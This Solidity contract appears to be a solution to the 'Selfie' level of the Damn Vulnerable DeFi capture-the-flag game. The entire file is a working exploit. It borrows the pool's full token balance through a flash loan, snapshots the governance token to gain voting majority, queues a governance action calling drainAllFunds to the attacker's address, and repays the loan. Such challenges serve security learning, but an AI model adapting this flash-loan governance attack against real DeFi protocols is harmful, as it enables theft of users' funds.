pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";

contract SelfieExploit {
    uint256 public evilActionId;
    address owner;
    DamnValuableTokenSnapshot damnValuableTokenSnapshot; // kind of unnecessary but convenient
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;

    // Initialization, boring...
    constructor(address selfiePoolAddress, address simpleGovernanceAddress, address damnValuableTokenSnapshotAddress){
        owner = msg.sender;
        selfiePool = SelfiePool(selfiePoolAddress);
        simpleGovernance = SimpleGovernance(simpleGovernanceAddress);
        damnValuableTokenSnapshot = DamnValuableTokenSnapshot(damnValuableTokenSnapshotAddress);
    }

    // Called to perform attack
    function exploit() external {
        // Attacker only!
        require(msg.sender == owner);
        // Establishing maximum loan amount
        uint256 maxLoanAmount = damnValuableTokenSnapshot.balanceOf(address(selfiePool));
        // Gaining temporary control of tokens in pool
        selfiePool.flashLoan(maxLoanAmount);
    }

    // Called by flash loan after delivery of tokens
    function receiveTokens(address, uint256 amount) external{
        // Always accepts, no fees for us anyway
        // Snapshot tokens, on exploitation failure all actions reverts anyway :)
        damnValuableTokenSnapshot.snapshot();
        // Having majority of tokens in current snapshot, we can queue actions.
        evilActionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                owner
            ),
            0 // no wei for u
        );
        // Return tokens to ensure no reverts
        damnValuableTokenSnapshot.transfer(address(selfiePool), amount);
    }
}